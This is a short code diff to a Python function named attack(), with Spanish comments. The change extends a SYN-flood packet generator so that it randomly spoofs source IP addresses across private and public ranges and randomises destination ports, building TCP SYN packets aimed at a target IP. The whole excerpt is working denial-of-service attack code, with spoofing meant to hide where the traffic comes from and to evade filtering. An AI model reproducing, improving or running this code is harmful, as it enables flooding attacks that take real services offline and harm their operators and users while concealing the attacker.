@@ -35,8 +35,16 @@ def attack():
 
             while running:
                 # Generar IPs y puertos de origen aleatorios
-                src_ip = f"10.0.0.{random.randint(1, 254)}"
+                src_ip = random.choice([
+                f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
+                f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}",
+                f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
+                f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"  # Simulación de IPs públicas
+                ])
+                
+                # Generar puertos de origen y destino aleatorios
                 src_port = random.randint(1024, 65535)
+                target_port = random.randint(1, 65535)
 
                 # Crear paquete TCP con flag SYN
                 ip_packet = IP(src=src_ip, dst=target_ip)
